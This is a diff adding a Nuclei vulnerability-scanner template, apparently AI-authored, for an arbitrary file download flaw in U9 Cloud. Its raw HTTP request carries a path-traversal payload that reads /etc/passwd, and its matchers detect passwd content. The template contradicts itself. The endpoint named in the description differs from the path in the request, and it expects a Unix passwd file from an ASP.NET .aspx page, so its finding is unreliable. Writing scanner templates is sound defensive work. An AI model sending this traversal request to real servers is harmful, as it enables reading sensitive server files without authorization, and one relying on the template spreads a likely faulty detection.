@@ -1,0 +1,30 @@
+id: u9cloud-unauth-file-download
+
+info:
+  name: U9 Cloud Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The U9 Cloud `printDynamaticExport.aspx` endpoint is vulnerable to arbitrary file download, allowing attackers to retrieve sensitive files from the server.
+  tags: u9cloud, file-download, critical
+
+http:
+  - raw:
+      - |
+        GET /Portal/Print/DynamaticExport.aspx?filePath=../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Security-Scanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x:0:0:" # Indication of /etc/passwd file content
+        part: body
+      - type: regex
+        regex:
+          - ".*?:x:\\d+:\\d+:.*?:/.*?:/.*?"
+        part: body
